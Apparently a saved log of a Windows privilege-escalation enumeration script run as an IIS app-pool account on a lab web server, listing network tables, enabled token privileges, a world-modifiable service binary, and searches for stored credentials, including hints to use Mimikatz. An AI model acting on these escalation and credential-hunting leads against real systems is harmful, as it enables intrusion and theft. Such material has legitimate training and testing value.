+Port configuration for Standard profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Standard profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+
+Log configuration:
+-------------------------------------------------------------------
+File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+Max file size   = 4096 KB
+Dropped packets = Disable
+Connections     = Disable
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ARP <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Interface: 10.10.207.167 --- 0xe
+  Internet Address      Physical Address      Type
+  10.10.0.1             02-c8-85-b5-5a-aa     dynamic
+  10.10.255.255         ff-ff-ff-ff-ff-ff     static
+  169.254.169.254       02-c8-85-b5-5a-aa     dynamic
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ROUTES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+===========================================================================
+Interface List
+ 14...02 fb c2 1e 7f 0f ......AWS PV Network Device #0
+  1...........................Software Loopback Interface 1
+ 24...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0        10.10.0.1    10.10.207.167     10
+        10.10.0.0      255.255.0.0         On-link     10.10.207.167    266
+    10.10.207.167  255.255.255.255         On-link     10.10.207.167    266
+    10.10.255.255  255.255.255.255         On-link     10.10.207.167    266
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+  169.254.169.123  255.255.255.255        10.10.0.1    10.10.207.167     10
+  169.254.169.249  255.255.255.255        10.10.0.1    10.10.207.167     10
+  169.254.169.250  255.255.255.255        10.10.0.1    10.10.207.167     10
+  169.254.169.251  255.255.255.255        10.10.0.1    10.10.207.167     10
+  169.254.169.253  255.255.255.255        10.10.0.1    10.10.207.167     10
+  169.254.169.254  255.255.255.255        10.10.0.1    10.10.207.167     10
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
+        224.0.0.0        240.0.0.0         On-link     10.10.207.167    266
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+  255.255.255.255  255.255.255.255         On-link     10.10.207.167    266
+===========================================================================
+Persistent Routes:
+  None
+
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+  1    306 ::1/128                  On-link
+ 14    266 fe80::/64                On-link
+ 14    266 fe80::b0b1:b17d:e0f5:4048/128
+                                    On-link
+  1    306 ff00::/8                 On-link
+ 14    266 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Hosts file <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CACHE DNS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WIFI <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+The system cannot find the file specified.
+The following command was not found: wlan show profile.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_->[*] BASIC USER INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeA
+ssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebb
+ugPrivilege
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT USER <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+The user name could not be found.
+
+More help is available by typing NET HELPMSG 2221.
+
+The request will be processed at a domain controller for domain WORKGROUP.
+
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ ==============================================================
+iis apppool\blog S-1-5-82-2734256158-3485737692-275298378-1529073857-2789248872
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+ERROR: Unable to get user claims information.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] USERS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    jeff
+The command completed with one or more errors.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] GROUPS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+System error 1312 has occurred.
+
+A specified logon session does not exist. It may already have been terminated.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ADMINISTRATORS GROUPS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT LOGGED USERS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+No User exists for *
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Kerberos Tickets <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Current LogonId is 0:0x1817e
+Error calling API LsaCallAuthenticationPackage (ShowTickets substatus): 1312
+
+klist failed with 0xc000005f/-1073741729: A specified logon session does not exist. It may already have been terminated.
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT CLIPBOARD <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Any password inside the clipboard?
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] SERVICES VULNERABILITIES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] SERVICE BINARY PERMISSIONS WITH WMIC + ICACLS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)
+
+C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)
+
+C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] UNQUOTED SERVICE PATHS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Progam.exe', then 'C:\Program Files\sof
+t\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'
+[i] The permissions are also checked and filtered using icacls
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+aspnet_state
+ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)
+
+AWSLiteAgent
+ C:\Program Files\Amazon\XenTools\LiteAgent.exe
+Invalid parameter "Files\Amazon\XenTools\LiteAgent.exe"
+NetTcpPortSharing
+ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)
+
+PerfHost
+ C:\Windows\SysWow64\perfhost.exe
+C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
+
+PsShutdownSvc
+ C:\Windows\PSSDNSVC.EXE
+C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)
+
+TrustedInstaller
+ C:\Windows\servicing\TrustedInstaller.exe
+C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
+
+WindowsScheduler
+ C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] DLL HIJACKING in PATHenv variable <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Maybe you can take advantage of modifying/creating some binary in some of the following locations
+[i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] CREDENTIALS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS VAULT <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault
+
+Currently stored credentials:
+
+* NONE *
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] DPAPI MASTER KEYS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] DPAPI MASTER KEYS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
+[i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+Looking inside \Microsoft\Credentials\
+Looking inside \Microsoft\Credentials\
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Unattended files <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] SAM
+'SYSTEM' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] McAffe SiteList.xml <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+File Not Found
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+File Not Found
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+File Not Found
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+File Not Found
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] GPP Password <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+The system cannot find the path specified.
+File Not Found
+The system cannot find the path specified.
+File Not Found
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Cloud Creds <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+File Not Found
+File Not Found
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AppCmd <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+C:\Windows\system32\inetsrv\appcmd.exe exists.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Files an registry that may contain credentials <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Searching specific files that may contains credentials.
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+Looking inside HKCU\Software\ORL\WinVNC3\Password
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
+    DefaultDomainName    REG_SZ
+    DefaultUserName    REG_SZ
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents
+    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion
+
+Looking inside HKCU\Software\TightVNC\Server
+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
+Looking inside HKCU\Software\OpenSSH\Agent\Keys
+C:\Windows\Panther\setupinfo
+C:\Windows\System32\inetsrv\appcmd.exe
+C:\Windows\SysWOW64\inetsrv\appcmd.exe
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
+C:\inetpub\wwwroot\Web.config
+C:\inetpub\wwwroot\Account\Web.Config
+C:\inetpub\wwwroot\admin\Web.Config
+C:\inetpub\wwwroot\admin\app\editor\Web.Config
+C:\inetpub\wwwroot\setup\Web.config
+
+
+
+C:\>
